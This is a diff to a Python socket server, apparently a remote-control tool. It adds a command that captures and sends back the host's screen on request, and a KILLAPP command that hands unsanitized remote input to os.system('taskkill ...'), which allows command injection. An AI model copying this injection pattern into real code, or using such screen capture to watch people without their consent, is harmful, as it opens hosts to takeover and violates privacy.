@@ -72,17 +72,26 @@ class Server(object):
             except Exception as e:
                 self.conn.send("Invalid command: " + str(e))
         elif Str.decode() == 'CAPSCR':
-            print(Str.decode())
+            pyautogui.screenshot().save('scr.png')
+            send = open('scr.png','rb')
+            while True:
+                data=send.read(1024)
+                if not data:
+                    break
+                self.conn.sendall(data)
+        
+            '''
             #Commands the server to capture its screen and send the screenshot back to the client
             pyautogui.screenshot().save('scr.png')
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as u:
-                u.connect((self.target_addr[0], 1025))
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((self.target_addr[0], 1025))
                 with open('scr.png', 'rb') as send:
                     while True:
                         data = send.read(1024)
                         if not data:
                             break
-                        u.sendall(data)
+                        s.sendall(data)
+            '''
         elif Str.decode() == 'SHWPRC':
             print(Str.decode())
             #Commands the server to send the file consisting of running processes
@@ -144,6 +153,14 @@ class Server(object):
                     self.conn.send('Failed'.encode())
             except:
                 self.conn.send('Failed'.encode())
+        elif Str.decode().find('KILLAPP') != -1:
+            name = str(Str.decode())
+            try:
+                os.system('taskkill /f /im '+name.split('KILLAPP',1)[1])                
+                self.conn.send('TRUE'.encode())
+            except:
+                self.conn.send('FALSE'.encode())
+                pass
         elif Str.decode().find('KILL') != -1:
             PID = int(Str.decode().split()[1])
             try:
